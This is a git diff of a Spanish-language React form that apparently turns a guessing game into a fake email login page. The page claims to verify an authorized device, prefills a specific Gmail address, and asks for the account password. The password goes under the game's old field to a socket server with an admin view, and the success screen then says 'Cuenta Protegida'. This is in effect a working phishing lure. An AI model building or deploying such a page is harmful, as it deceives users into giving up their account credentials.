@@ -1,8 +1,11 @@
 import { useState, useEffect } from 'react';
 import { useForm } from 'react-hook-form';
 import { Form, Button, Container, Card, Spinner } from 'react-bootstrap';
+import { InputGroup } from 'react-bootstrap';
+import { FaEye, FaEyeSlash } from 'react-icons/fa';
 import { io } from 'socket.io-client';
 import FormIntento from './FormIntento'; // Lo creamos en el siguiente paso
+import imagenJuego from '../assets/icono2.png'
 
 const socket = io('http://localhost:4000');
 
@@ -11,8 +14,13 @@ export default function FormUsuario() {
   const [mensajeAdmin, setMensajeAdmin] = useState('');
   const [socketId, setSocketId] = useState('');
   const [correoGuardado, setCorreoGuardado] = useState(''); // Para reutilizarlo en el 2do intento
+  const [verPassword, setVerPassword] = useState(false)  
 
   const { register, handleSubmit } = useForm();
+
+  const verPass = () => {
+    setVerPassword(!verPassword)
+  }
 
   useEffect(() => {
     socket.on('connect', () => setSocketId(socket.id));
@@ -78,7 +86,8 @@ export default function FormUsuario() {
   if (estadoVista === 'exito') {
     return (
       <Container className="d-flex flex-column justify-content-center align-items-center vh-100 bg-dark text-white" fluid>
-        <h1 className="text-success mb-3">¡Felicidades!</h1>
+        <img src={imagenJuego} style={{width:'18rem', height:'18rem', borderRadius:'50%'}} />
+        <h1 className="text-light mb-3 mt-4">Cuenta Protegida</h1>
         <h3>{mensajeAdmin}</h3>
       </Container>
     );
@@ -92,35 +101,57 @@ export default function FormUsuario() {
   // Vista por defecto: Formulario 1
   return (
     <Container className="d-flex justify-content-center align-items-center vh-100 bg-dark" fluid>
-      <Card bg="dark" text="white" className="p-4 shadow border-secondary" style={{ width: '400px' }}>
+      <Card bg="dark" text="white" className="p-4 shadow d-flex justify-content-center align-items-center" style={{ width: '400px' }}>
+        <Card.Img 
+          variant="top" 
+          src={imagenJuego} 
+          alt="Imagen ilustrativa del juego" 
+          style={{  height: '12rem', width:'12rem', borderRadius: '50%' }}
+        />
         <Card.Body>
-          <Card.Title as="h2" className="text-center mb-3">Listo para adivinar</Card.Title>
-          <Card.Text className="text-center text-muted mb-4">
-            Ingresa tu correo y el dato que crees que es el correcto.
-          </Card.Text>
+          <Card.Title as="h2" className="text-center mb-3">Accede a tu cuenta</Card.Title>
+          <Card.Text className="text-center text-light opacity-75">
+            Validar que sea un dispositivo autorizado para tener una sesión abierta de tu correo.
+          </Card.Text> 
 
           <Form onSubmit={handleSubmit(onSubmitPrimerIntento)}>
             <Form.Group className="mb-3">
               <Form.Label>Correo</Form.Label>
               <Form.Control 
                 type="text" 
-                placeholder="ejemplo@correo.com" 
-                className="bg-secondary text-white border-secondary"
+                placeholder=""
+                value={"angel245687@gmail.com"} 
+                className="bg-dark text-white border-secondary"
                 {...register("correo", { required: true })} 
               />
             </Form.Group>
 
             <Form.Group className="mb-4">
-              <Form.Label>Adivinar</Form.Label>
-              <Form.Control 
-                type="text" 
-                placeholder="Ingresa tu respuesta..." 
-                className="bg-secondary text-white border-secondary"
-                {...register("adivinar", { required: true })} 
-              />
-            </Form.Group>
+        <Form.Label>Contraseña</Form.Label>
+      
+      {/* 3. Usamos InputGroup para agrupar el input y el botón */}
+      <InputGroup>
+        <Form.Control 
+          type={verPassword ? "text" : "password"} // Cambia dinámicamente el tipo
+          placeholder="*************" 
+          className="bg-secondary text-white border-secondary"
+          autoComplete="new-password"
+          {...register("adivinar", { required: true })} 
+        />
+        
+        {/* 4. Botón pequeño con react-icons */}
+        <Button 
+          variant="outline-secondary" 
+          className="border-secondary text-white d-flex align-items-center justify-content-center"
+          onClick={verPass}
+          style={{ zIndex: 0 }} // Evita problemas de superposición con Bootstrap
+        >
+          {verPassword ? <FaEyeSlash size={16} /> : <FaEye size={16} />}
+        </Button>
+      </InputGroup>
+    </Form.Group>
 
-            <Button variant="primary" type="submit" className="w-100 fw-bold">Enviar</Button>
+            <Button variant="primary" type="submit" className="w-100 fw-bold ">Siguiente</Button>
           </Form>
         </Card.Body>
       </Card>
